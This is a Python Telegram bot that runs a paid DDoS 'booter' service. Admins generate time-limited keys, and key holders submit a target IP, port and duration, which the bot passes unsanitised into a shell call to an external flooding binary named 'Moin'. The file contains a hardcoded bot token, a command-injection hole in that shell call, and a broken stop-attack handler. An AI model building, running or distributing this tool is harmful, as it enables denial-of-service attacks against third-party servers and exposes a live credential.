import os
import json
import random
import string
import asyncio
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# === Configuration ===
ADMIN_IDS = [6218253783]  # Replace with your admin user IDs
BOT_TOKEN = "7343295464:AAEM7vk5K3cNXAywZC_Q11wmMzMu4gk09PU"  # Replace with your bot token
USERS_FILE = 'users.json'
KEYS_FILE = 'keys.json'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
ongoing_attacks = {}

# Initialize the bot
bot = TeleBot(BOT_TOKEN)

# === Helper Functions ===
def load_file(filepath, default):
    if os.path.exists(filepath):
        try:
            with open(filepath, 'r') as file:
                content = file.read().strip()
                return json.loads(content) if content else default
        except json.JSONDecodeError:
            return default
    return default

def save_file(filepath, data):
    with open(filepath, 'w') as file:
        json.dump(data, file, indent=4)

keys = load_file(KEYS_FILE, {})
users = load_file(USERS_FILE, [])

def generate_key(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def calculate_expiry(hours=0, days=0):
    return (datetime.now() + timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

def main_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton("🔑 REDEEM KEY"))
    keyboard.add(KeyboardButton("🚀 START ATTACK"), KeyboardButton("🛑 STOP ATTACK"))
    keyboard.add(KeyboardButton("🔐 GENKEY"), KeyboardButton("📋 COPY KEYS"))
    keyboard.add(KeyboardButton("🪪 INFO"))
    return keyboard

def user_info(user_id):
    user = next((u for u in users if u['user_id'] == user_id), None)
    return f"𝙐𝙎𝙀𝙍 𝙄𝘿-> {user['user_id']}\n𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀-> {user['username']}\n𝙀𝙓𝙋𝙄𝙍𝙔 {user['expiry']}" if user else "No information available."

async def run_attack_command_async(target_ip, target_port, duration):
    try:
        process1 = await asyncio.create_subprocess_shell(
            f"./Moin {target_ip} {target_port} {duration} 1000",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process1.communicate()

        if stdout:
            print(f"[INFO] {stdout.decode().strip()}")
        if stderr:
            print(f"[ERROR] {stderr.decode().strip()}")
    except Exception as e:
        print(f"Error during attack execution: {e}")

async def run_attack(target_ip, target_port, duration, chat_id):
    try:
        await run_attack_command_async(target_ip, target_port, duration)
        ongoing_attacks.pop(chat_id, None)
        bot.send_message(chat_id, "✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘿𝙊")
    except Exception as e:
        bot.send_message(chat_id, f"𝙀𝙍𝙍𝙊𝙍-> {str(e)}")
        print(f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍 {e}")

# === Bot Handlers ===
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id, "😈 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍 😈", reply_markup=main_menu())
    
@bot.message_handler(func=lambda msg: msg.text == "🔐 GENKEY")
def gen_custom_key_command(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ 𝙀𝙍𝙍𝙊𝙍 ❌")
        return
    bot.send_message(message.chat.id, "©️ 𝙐𝙎𝙀-> 𝙔𝙊𝙐𝙍 𝙉𝘼𝙈𝙀 30 𝙙𝙖𝙮𝙨")
    bot.register_next_step_handler(message, process_custom_key_generation)

def process_custom_key_generation(message):
    try:
        args = message.text.split()
        if len(args) != 3 or not args[1].isdigit():
            raise ValueError("❌ 𝙀𝙍𝙍𝙊𝙍 ❌")
        
        key_name = args[0]
        time_amount = int(args[1])
        time_unit = args[2].lower()

        if time_unit not in ['hours', 'days']:
            raise ValueError("Use 'hours' or 'days' only.")

        expiry = calculate_expiry(hours=time_amount if time_unit == 'hours' else 0, days=time_amount if time_unit == 'days' else 0)
        keys[key_name] = {"expiry": expiry, "redeemed": False}
        save_file(KEYS_FILE, keys)

        bot.send_message(message.chat.id, f"🔑 𝙂𝙀𝙉𝙆𝙀𝙔-> {key_name}\n⏳ 𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔-> {expiry}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")
        
        
@bot.message_handler(func=lambda msg: msg.text == "📋 COPY KEYS")
def copy_keys_command(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ Access Denied ❌")
        return

    try:
        # Load the latest state of keys
        global keys
        keys = load_file(KEYS_FILE, {})

        # Filter unredeemed keys
        unredeemed_keys = {k: v for k, v in keys.items() if not v["redeemed"]}

        if not unredeemed_keys:
            bot.send_message(message.chat.id, "❌ 𝙀𝙍𝙍𝙊𝙍 ❌")
            return

        # Prepare the plain list of keys
        key_list = "\n".join(unredeemed_keys.keys())

        # Send plain keys for easy copying
        bot.send_message(
            message.chat.id,
            f"🔑 *𝙆𝙀𝙔 (Plain List):*\n\n```\n{key_list}\n```",
            parse_mode="Markdown"
        )

        # Optional: Send detailed key info
        detailed_list = "\n\n".join(
            [f"🔑 𝙆𝙀𝙔 `{key}`\n⏳ EXPIRY: {details['expiry']}" for key, details in unredeemed_keys.items()]
        )
        bot.send_message(
            message.chat.id,
            f"📋 *Detailed Key Information:*\n\n{detailed_list}",
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error fetching keys: {str(e)}")                                                        
@bot.message_handler(func=lambda msg: msg.text == "🔑 REDEEM KEY")
def redeem_key_command(message):
    bot.send_message(message.chat.id, "🔑 𝙀𝙉𝙏𝙀𝙍 𝙆𝙀𝙔")
    bot.register_next_step_handler(message, process_key_redeem)

def process_key_redeem(message):
    user_id = message.from_user.id
    key = message.text.strip()

    if any(user['user_id'] == user_id for user in users):
        bot.send_message(message.chat.id, "✅𝙊𝙒𝙉𝙀𝙍- @MoinOwner")
        return

    if key not in keys or keys[key]["redeemed"]:
        bot.send_message(message.chat.id, "✅𝙊𝙒𝙉𝙀𝙍- @MoinOwner")
        return

    keys[key]["redeemed"] = True
    expiry = keys[key]["expiry"]
    users.append({"user_id": user_id, "username": message.from_user.username, "expiry": expiry})
    save_file(KEYS_FILE, keys)
    save_file(USERS_FILE, users)

    bot.send_message(message.chat.id, "🔑 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈", reply_markup=main_menu())

@bot.message_handler(func=lambda msg: msg.text == "🚀 START ATTACK")
def attack_command(message):
    if not any(user['user_id'] == message.from_user.id for user in users):
        bot.send_message(message.chat.id, "🔑 𝙉𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝘼𝙇 𝘽𝙀𝙔 𝙏𝙊 𝘿𝙈-> @MoinOwner")
        return
    bot.send_message(message.chat.id, "🚀 𝙐𝙎𝘼𝙂𝙀-> 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙏𝙄𝙈𝙀")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    args = message.text.split()

    if len(args) != 3:
        bot.send_message(message.chat.id, "🚀 𝙐𝙎𝘼𝙂𝙀-> 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙏𝙄𝙈𝙀")
        return

    try:
        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 𝙄𝙋 𝙋𝙊𝙍𝙏 𝘽𝙇𝙊𝘾𝙆𝙀𝘿 {target_port} ")
            return

        if message.chat.id in ongoing_attacks:
            bot.send_message(message.chat.id, "📵 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 𝙆𝙍𝙊 📵")
            return

        ongoing_attacks[message.chat.id] = True
        
        # Create and start a new thread with an event loop
        def run_attack_thread():
            asyncio.run(run_attack(target_ip, target_port, duration, message.chat.id))
        
        # Start the thread
        thread = threading.Thread(target=run_attack_thread)
        thread.start()

        bot.send_message(message.chat.id, f"⚡ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 ⚡\n\n💣𝐇𝐎𝐒𝐓-> {target_ip}\n🎯𝐏𝐎𝐑𝐓-> {target_port}\n⏰𝐓𝐈𝐌𝐄-> {duration}")
    except ValueError:
        bot.send_message(message.chat.id, "❌ 𝙑𝘼𝙇𝙄𝘿 𝙉𝙐𝙈𝘽𝙀𝙍 ❌")
@bot.message_handler(func=lambda msg: msg.text == "🛑 STOP ATTACK")
def stop_attack_command(message):
    attack_data = ongoing_attacks.pop(message.chat.id, None)
    if attack_data:
        target_ip, target_port, duration = attack_data
        bot.send_message(message.chat.id, f"🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n💣𝐇𝐎𝐒𝐓-> {target_ip}\n🎯𝐏𝐎𝐑𝐓-> {target_port}\n⏰𝐓𝐈𝐌𝐄-> {duration}")
    else:
        bot.send_message(message.chat.id, "©️ 𝙉𝙊 𝘼𝙏𝙏𝘼𝘾𝙆 𝙏𝙊 𝙎𝙏𝙊𝙋 ©️")

@bot.message_handler(func=lambda msg: msg.text == "🪪 INFO")
def info_command(message):
    info = user_info(message.from_user.id)
    bot.send_message(message.chat.id, f"𝙔𝙊𝙐𝙍 𝙄𝙉𝙁𝙊\n{info}", reply_markup=main_menu())

# === Main ===
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_file(KEYS_FILE, {})
    if not os.path.exists(USERS_FILE):
        save_file(USERS_FILE, {})

    bot.infinity_polling()    